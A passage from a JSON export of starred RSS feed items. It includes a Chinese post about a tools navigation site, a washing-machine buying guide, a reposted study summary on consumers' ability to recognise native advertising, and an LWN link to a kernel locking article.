href=\"https://shuziyimin.org/#streaming-animation-2-5\">番剧流媒体</a>也有涉及。相关如何看这些流媒体的教程也会加入到导航站，方便查看。</p>\n<p><strong> 电子书 </strong></p>\n<p><strong> 如何在中国购买阅读英文电子书 </strong> 是一篇在草稿箱放了两年的文章。借着做导航站的契机，就把提及的服务全部整理出来。</p>\n<p>普通主流电子书平台选 <a href=\"https://shuziyimin.org/#ebook-3-1\">Kindle</a> 或者 <a href=\"https://shuziyimin.org/#ebook-3-1\">iBook</a> 即可；有声书选 <a href=\"https://shuziyimin.org/#ebook-audio-3-2\">Audible</a>；看狼人吸血鬼相关的网络小说去 <a href=\"https://shuziyimin.org/#ebook-web-3-4\">Wattpad</a>，看武侠小说的英文版去 <a href=\"https://shuziyimin.org/#ebook-web-3-4\">WuxiaWorld</a>。只是偶尔看两本书，并不一定要最新最流行的电子书，可以购买 <a href=\"https://shuziyimin.org/#ebook-subscription-3-5\">Kindle Unlimited</a> 或者 <a href=\"https://shuziyimin.org/#ebook-subscription-3-5\">SCRIBD</a> 的服务。如果是看电子杂志，那最不应该错过 Apple <a href=\"https://shuziyimin.org/#ebook-3-1\">News +</a>。</p>\n<p><strong> 播客 与 Newsletter</strong></p>\n<p>播客 与 Newsletter 的相关推荐还没整理出来，主要是我自己订阅的 Newsletter 就基本没看过…</p>\n<p><strong> 日常工具 </strong></p>\n<p>日常工具主要介绍了主流的浏览器、搜索引擎、邮箱服务与云服务。</p>\n<p>都是比较常见的服务，所有能看到这篇文章的读者应该早就熟悉了这些服务。</p>\n<p><strong> 生产力工具 </strong></p>\n<p>生产力工具里主要介绍了办公文档处理、新型文档与团队协作、团队交流工具。</p>\n<p>在传统办公文档工具中，我强烈推荐 <a href=\"https://shuziyimin.org/tools.html#productivity-doc-7-1\">Google workspace</a>，也就是 Google doc、Google sheet、Google drive 一系列套件，基本能够满足日常办公需求。</p>\n<p>在新型办公文档中，融资较高以及用户量达到 2 千万的产品基本都提到了。因为新型办公文档的盈利方向主要是团队付费，所以他们都在团队协作上发力。<a href=\"https://shuziyimin.org/tools.html#productivity-team-7-2\">Airtable</a> 和 <a href=\"https://shuziyimin.org/tools.html#productivity-team-7-2\">Coda</a> 文档的自动化流程都很惊艳，值得一试，可能会在文档处理上给你带来新的启发。</p>\n<p><strong> 隐私保护 </strong></p>\n<p>这块主要介绍了虚拟邮箱转发服务、密码管理器、两步验证应用。</p>\n<p>虚拟邮箱转发服务目前个人在使用的是 <a href=\"https://shuziyimin.org/tools.html#privacy-mail-forwarder-8-1\">Forward Email</a> ，Cloudflare 的邮件转发服务还在邀请内测中，开放之后估计会选择 Cloudflare 的服务。</p>\n<p><a href=\"https://shuziyimin.org/tools.html#privacy-password-manager-8-2\">密码管理器</a>和<a href=\"https://shuziyimin.org/tools.html#privacy-mfa-8-3\">两步验证</a>的产品排列顺序都是按照 NYT Wirecutter 的推荐顺序排列。NYT Wirecutter 是 NYT 旗下做产品测评的栏目，在实际试用几次他们的推荐后，个人认为他们推荐为第一的产品基本就是这个品类中最棒的产品。密码管理器个人使用的是 <a href=\"https://shuziyimin.org/tools.html#privacy-password-manager-8-2\">Bitwarden</a>，因为免费。 两步验证产品用的是 <a href=\"https://shuziyimin.org/tools.html#privacy-mfa-8-3\">Google Authenticator</a>。</p>\n<p><strong> 商家 / 专业用户服务 </strong></p>\n<p>这部分介绍的产品较多，涉及了 <a href=\"https://shuziyimin.org/tools.html#sme-vps-9-1\">VPS/ 轻量云服务器</a>、<a href=\"https://shuziyimin.org/tools.html#sme-website-builder-9-2\">博客 / 电商网站搭建</a>、<a href=\"https://shuziyimin.org/tools.html#sme-mail-9-3\">邮件营销服务商</a>、<a href=\"https://shuziyimin.org/tools.html#sme-newsletter-9-4\">Newsletter 服务商</a>、<a href=\"https://shuziyimin.org/tools.html#sme-payment-9-5\">收款服务</a>等。</p>\n<p>因为业务模式和预算不同，选择的产品差距也比较大，所以这块把业界能叫的上来名字的产品基本都列举出来了，按照目前的用户基数或者市场份额来排序。如果有未提及的产品，欢迎在导航站页面 <a href=\"https://blog.shuziyimin.org/\">提交</a> 你想要提到的服务。</p>\n<h1>导航站用的什么技术？</h1>\n<p>网站使用了 <a href=\"https://blog.shuziyimin.org/\">Viggo</a> 的 <a href=\"https://blog.shuziyimin.org/\">导航站模版</a>。</p>\n<p>导航站没有使用动态页面，所有静态 HTML 都是手动写的。因为收集好各个网站名称、网站 URL、网站简介、网站 icon 就基本完成了。所以收集好上述内容后，我用 Google sheet 中的 CONCATENATE 函数连接，一键生成需要的 HTML，复制粘贴就完成了页面的制作。</p>"
    },
    "origin": {
        "streamId": 39,
        "title": "数字移民",
        "htmlUrl": "https://blog.shuziyimin.org/",
        "feedUrl": "https://blog.shuziyimin.org/feed"
    }
},
{
    "id": "https://www.qwyw.org/wordpress?p=816",
    "timestampUsec": "1659488807944465",
    "categories": [
        "器物指南",
        "洗衣机",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "洗衣机：避坑指南和选购建议（更新）",
    "author": ";shrugged",
    "published": 1516716900,
    "updated": 1516716900,
    "alternate": [
        {
            "href": "https://www.qwyw.org/archives/816",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>避坑指南</h2><ul><li><p>在各国消费者组织的评测中，滚筒的总分（或综合得分）整体上高于波轮，售价也普遍高于波轮。</p></li><li><p>滚筒比波轮洗得更干净，脱水更给力，洗涤更温和（衣物磨损小）。</p></li><li><p>滚筒洗涤时间更长，机身更重（不易搬动），洗涤过程中加衣服不方便，而且通常较贵。</p></li><li><p>使用成本方面，滚筒更省水，多数机构认为波轮更省电，部分认为如果都开加热洗涤，那么滚筒更省电。</p></li><li><p>噪音和振动方面，多数机构认为滚筒噪声更大、振动更厉害。</p></li><li><p>转速更高脱水性能不一定更强。在 Which？的测试中，一些 1200 rpm 的洗衣机比 1600 rpm 的脱水效果更好。</p></li><li><p>在 Choice 的洗衣机可靠性调查中，滚筒式的可靠性和满意度都略高于波轮式。 在各国消费组织对洗衣机品牌的可靠性调查中，Miele、LG、Bosch 的可靠性较高。</p></li><li><p>CR 认为蒸汽功能可以稍微提升去污效果，去味效果比烘干好，但可能让衣服皱巴巴的。</p></li><li><p>Which？认为洗烘一体机的烘干效果一般不及独立式烘干机，它们的烘干容量一般比洗涤容量小，在使用上不方便。</p></li><li><p>容量大不一定好，洗衣机在接近填满时洗涤效果最好。大多数中小家庭用 7 kg 的就够了，大多数人一次只洗 3.5kg 的衣服。</p></li></ul><h2>选购建议</h2><ul><li><p>如果你预算充裕，衣服比较金贵，注重洁净效果，那么售价较高、对衣物比较温和、洗净能力比较强的滚筒或许适合你。</p></li><li><p>如果你所在地区房价爆表，在意空间利用，那么头顶可置物的滚筒可能适合你。</p></li><li><p>如果你预算不多，经常搬家，那么售价较便宜、机身较轻的波轮或许适合你。</p></li><li><p>如果你老是洗涤中途才想起还有衣服没洗，不喜欢弯腰操作，那么中途添衣方便、盖子上开的波轮式或许适合你。</p></li><li><p>如果你对噪音和振动很敏感，那么最好实地考察过后再做决定，实在要闭着眼睛下单，那么或许波轮比较适合你。</p></li><li><p>如果你很在意能耗，那么手洗或许适合你——玩笑，那么省水的滚筒或许适合你。至于省电，一般认为波轮较省，实际上这和开不开加热洗涤有关。</p></li></ul><h2>主要来源</h2><p><a href=\"https://www.consumerreports.org/products/front-load-washer/ratings-overview/\">Washer Ratings &amp; Reliability – Consumer Reports</a></p><p><a href=\"https://www.choice.com.au/home-and-living/laundry-and-cleaning/washing-machines/review-and-compare/washing-machines\">Washing machine reviews – CHOICE</a></p><p><a href=\"https://www.which.co.uk/reviews/washing-machines\">Washing machine reviews – Which?</a></p><p><a href=\"https://www.cca.org.cn/jmxf/detail/24914.html\">55款洗衣机商品比较试验结果 – 中国消费者协会</a></p><p><a href=\"https://www.consumer.org.hk/ws_gb/choice/488/washing-machines.html%3Fappliances%3Dtest\">叶轮式与前置式洗衣机 哪种较悭电悭水？- 香港消委会</a></p><p><a href=\"https://www.consumer.org.hk/ws_gb/choice/464_01\">测试18款洗衣机　5款洗衣特别乾净又悭水</a></p><p><a href=\"https://www.consumerreports.org/cro/washing-machines/buying-guide.htm\">Best Washing Machine Buying Guide – Consumer Reports</a></p><p><a href=\"https://www.choice.com.au/home-and-living/laundry-and-cleaning/washing-machines/buying-guides/washing-machines\">Buying the best washing machine – CHOICE</a></p><p><a href=\"https://www.which.co.uk/reviews/washing-machines/article/which-washing-machine/which-washing-machine-should-you-buy\">Which Washing Machine Should You Buy? – Which?</a></p><p><a href=\"https://www.which.co.uk/reviews/washing-machines/article/which-washing-machine/washing-machine-jargon-buster\">Washing machine jargon buster – Which?</a></p><p><a href=\"https://www.choice.com.au/home-and-living/laundry-and-cleaning/washing-machines/articles/cycle-times\">Washing machine cycle times – CHOICE</a></p>"
    },
    "origin": {
        "streamId": 41,
        "title": "器物于我",
        "htmlUrl": "https://www.qwyw.org/",
        "feedUrl": "https://www.qwyw.org/feed"
    }
},
{
    "id": "https://www.qwyw.org/?p=4286",
    "timestampUsec": "1659488807944468",
    "categories": [
        "反营销",
        "器物资讯",
        "他山之石",
        "软广",
        "软文",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "他山之石：软文的迷惑性有多强？——来自实验的证据",
    "author": ";shrugged",
    "published": 1517132160,
    "updated": 1517132160,
    "alternate": [
        {
            "href": "https://www.qwyw.org/archives/4286",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div><p>「他山之石」专题转载非本站原创的文章。本文作者：<a href=\"https://www.zhihu.com/people/econhistorylover/activities\">Manolo</a>，原始来源：<a href=\"https://zhuanlan.zhihu.com/p/32983944\">裘箕录</a>，转载已征得作者同意。</p><p>站着挣钱难，躺着挣钱不好看，不少媒体于是选择了蹲着挣钱：发软文[1]。上到Science，中到《纽约时报》，下到各大互联网新闻站，都按正常报道的格式，刊载商家提供的内容，同时在旁边羞答答地加几个小字：「广告」、「品牌合作」、「付费内容」、「sponsored」、「partner」、「brand voice」，等等。那么，消费者真的能分辨媒体本身的内容和这些广告吗？Hyman 等四位学者发表在 <em>Yale Technology Law Journal</em> 的期刊发现：<strong>大部分消费者都做不到</strong>。</p><p><img src=\"https://www.qwyw.org/wp-content/uploads/2018/01/v2-0be4720415d73e6b3b173892d6eb0cf5_hd.jpg\" alt='\"'><em>图1 左侧是消费者对软文的辨识结果，右图是消费者对正常广告的辨识结果。蓝色代表成功辨认，黄色代表辨认错误，灰色是「不知道」</em></p><p>文章的研究方法很简单粗暴：招募近1000名年龄、教育背景各异的参与者，向他们随机展示从《纽约时报》、《福布斯》、《名利场》、《大西洋月刊》等媒体提取的正常广告、软文和正常报道三种内容，然后让他们辨认。大致结果如上图所示：对于正常广告，<strong>超过80%的</strong>参与者能够辨认出这是广告；对于软文，这个比例<strong>直降到不足40%</strong>。进一步的统计分析显示：<strong>参与者年龄</strong>和正确辨认有显著的正相关；<strong>教育程度</strong>有一定正相关；<strong>性别</strong>和正确率基本不相关。</p><p><img src=\"https://www.qwyw.org/wp-content/uploads/2018/01/v2-e40bf17838631ff9f52cb39200869aa0_hd.jpg\" alt='\"'><em>表1 不同标识对消费者的迷惑程度。三列数字，从左往右，分别是参与者回答相应内容是「付费内容」、「非付费内容」和「不知道是哪一种」的比例。从上到下，迷惑力逐渐增强</em></p><p>那么，哪些词汇最能迷惑消费者呢？尽管原文针对英文，但结果也有借鉴意义。见上表，迷惑能力最差的词汇当属「付费广告」。实际上，只要标识中带「付费」二字，消费者的「雷达」都会显得特别灵敏。相比之下，「赞助内容」、「品牌声音」、「品牌出版」、「合作内容」这类标识，对消费者的引导能力要强得多。对广告商来说，让广告显得不像广告，是永恒的追求，但法律又不可能置消费者而不顾。互联网时代，广告越来越难辨认，保护消费者的法律也需要反思。</p><p>[1] 严格来说，这篇文章研究的是所谓「原生广告」。不过，原生广告和软文之间究竟有什么实质的区别？笔者在搜索引擎和知乎内部搜索，都没有得到很肯定且受公认的答案。如果知友有好的见解或批评，十分欢迎提出！</p><p>参考文献：Hyman, David A., et al. “Going native: Can consumers recognize native advertising? Does it matter?.” <em>Yale Technology Law Journal.</em> 19 (2017): 77-112.</p><div></div></div>"
    },
    "origin": {
        "streamId": 41,
        "title": "器物于我",
        "htmlUrl": "https://www.qwyw.org/",
        "feedUrl": "https://www.qwyw.org/feed"
    }
},
{
    "id": "903681",
    "timestampUsec": "1659536025144495",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Vetter: Locking engineering hierarchy",
    "author": ";corbet",
    "published": 1659534120,
    "updated": 1659534120,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/903681/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "Daniel Vetter <a href=\"https://blog.ffwll.ch/2022/08/locking-hierarchy.html\">continues his\nseries</a> on locking in the kernel.\n<p>\n</p><blockquote>\n\n\tThis part goes through a pile of locking pattern and designs, from\n\tmost favourable and easiest to adjust and hence resulting in a long\n\tterm maintainable code base, to the least favourable since hardest\n\tto ensure it works correctly and stays that way while the code\n\tevolves. For convenience even color coded, with the dangerous\n\tlevels getting progressively more crispy red indicating how close\n\tto the burning fire you are! Think of it as Dante’s Inferno, but\n\tfor locking.\n</blockquote><br clear=\"all\"><table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
}
]}
